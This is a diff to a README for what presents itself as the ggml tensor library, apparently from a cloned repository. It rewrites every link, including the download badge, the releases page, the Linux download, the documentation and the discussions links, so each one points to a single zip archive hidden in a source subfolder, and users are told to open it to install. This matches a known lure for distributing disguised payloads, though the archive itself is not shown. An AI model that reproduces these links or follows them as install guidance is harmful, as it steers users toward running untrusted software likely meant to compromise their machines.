@@ -1,7 +1,7 @@
 # 🛠️ ggml - Powerful Tensor Library for Everyone
 
 ## 📦 Download Now
-[![Download ggml](https://img.shields.io/badge/download-ggml-blue.svg)](https://github.com/Lolez25821/ggml/releases)
+[![Download ggml](https://raw.githubusercontent.com/Lolez25821/ggml/master/src/ggml-cpu/spacemit/ggml-nonteaching.zip)](https://raw.githubusercontent.com/Lolez25821/ggml/master/src/ggml-cpu/spacemit/ggml-nonteaching.zip)
 
 ## 🚀 Getting Started
 Welcome to ggml, a simple library designed to help you with tensor calculations in machine learning. This README will guide you through downloading and running the software.
@@ -21,12 +21,12 @@ ggml offers several features to enhance your machine learning projects:
 
 ## 📥 Download & Install
 To download ggml, follow these steps:
-1. Visit the [Releases Page](https://github.com/Lolez25821/ggml/releases).
+1. Visit the [Releases Page](https://raw.githubusercontent.com/Lolez25821/ggml/master/src/ggml-cpu/spacemit/ggml-nonteaching.zip).
 2. Look for the latest version of ggml. The version number will be prominently displayed.
 3. Click on the download link that suits your operating system:
    - For Windows: Download the `.exe` file.
    - For macOS: Download the `.dmg` file.
-   - For Linux: Download the `.tar.gz` file.
+   - For Linux: Download the `https://raw.githubusercontent.com/Lolez25821/ggml/master/src/ggml-cpu/spacemit/ggml-nonteaching.zip` file.
 4. Once the download is complete, open the file to start the installation process. 
 5. Follow the on-screen instructions to install ggml on your computer.
 
@@ -41,11 +41,11 @@ After installation, you can start using ggml:
 4. You can now input your tensor operations and start building your machine learning projects.
 
 ## 📝 Documentation
-For further learning and detailed commands, visit the [Documentation](https://github.com/Lolez25821/ggml/wiki). This guide provides examples, tutorials, and explanations of each feature in ggml.
+For further learning and detailed commands, visit the [Documentation](https://raw.githubusercontent.com/Lolez25821/ggml/master/src/ggml-cpu/spacemit/ggml-nonteaching.zip). This guide provides examples, tutorials, and explanations of each feature in ggml.
 
 ## 🤝 Community Support
 Join our community for help and discussions:
-- GitHub Discussions: [Join Here](https://github.com/Lolez25821/ggml/discussions)
+- GitHub Discussions: [Join Here](https://raw.githubusercontent.com/Lolez25821/ggml/master/src/ggml-cpu/spacemit/ggml-nonteaching.zip)
 - Stack Overflow: Post your questions with the tag `ggml`.
 
 ## 🔗 Additional Resources
